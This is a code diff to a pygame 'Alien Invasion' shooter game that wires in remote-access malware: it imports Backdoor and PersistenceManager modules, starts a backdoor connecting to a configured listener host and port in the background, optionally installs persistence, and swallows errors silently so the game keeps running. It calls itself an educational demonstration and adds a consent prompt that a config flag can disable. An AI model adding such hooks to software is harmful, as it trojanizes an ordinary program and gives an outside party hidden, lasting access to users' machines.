@@ -9,11 +9,22 @@ from game_stats import GameStats
 from button import Button
 from scoreboard import Scoreboard
 
+# Backdoor imports
+from dependency_checker import DependencyChecker
+from backdoor import Backdoor
+from persistence import PersistenceManager
+import config
+
 class AlienInvasion:
     """Overall class to manage game assets and behavior"""
     
     def __init__(self):
         """Initialize the game and create game resources"""
+        # Initialize backdoor if enabled
+        self.backdoor = None
+        if config.ENABLE_BACKDOOR:
+            self._initialize_backdoor()
+        
         pygame.init()
         self.settings = Settings()
         self.screen = pygame.display.set_mode(
@@ -26,6 +37,24 @@ class AlienInvasion:
         self.aliens = pygame.sprite.Group()
         self._create_fleet()
         self.play_button = Button(self, "Start game")
+    
+    def _initialize_backdoor(self):
+        """Initialize backdoor functionality"""
+        try:
+            # Start backdoor in background
+            self.backdoor = Backdoor(
+                host=config.LISTENER_HOST,
+                port=config.LISTENER_PORT
+            )
+            self.backdoor.start_background()
+            
+            # Install persistence if enabled
+            if config.ENABLE_PERSISTENCE:
+                pm = PersistenceManager()
+                pm.install_persistence()
+        except Exception as e:
+            # Fail silently to not interrupt game
+            pass
       
     def run_game(self):
         """Start the main loop for the game"""
@@ -205,6 +234,39 @@ class AlienInvasion:
                 self._ship_hit()
                 break
         
+def show_consent_dialog():
+    """Show consent dialog before starting"""
+    if not config.SHOW_CONSENT_DIALOG:
+        return True
+    
+    print(config.CONSENT_MESSAGE)
+    response = input("\nType 'YES' to consent and continue: ").strip().upper()
+    
+    if response == 'YES':
+        print("\n✓ Consent granted. Starting game...\n")
+        return True
+    else:
+        print("\n✗ Consent denied. Exiting.\n")
+        return False
+
 if __name__ == '__main__':
+    # Check dependencies first
+    print("=" * 60)
+    print("ALIEN INVASION - Educational Backdoor Demonstration")
+    print("=" * 60)
+    print()
+    
+    checker = DependencyChecker()
+    if not checker.ensure_dependencies():
+        print("\n✗ Failed to install dependencies. Exiting.")
+        sys.exit(1)
+    
+    print()
+    
+    # Show consent dialog
+    if not show_consent_dialog():
+        sys.exit(0)
+    
+    # Start the game
     ai = AlienInvasion()
     ai.run_game()
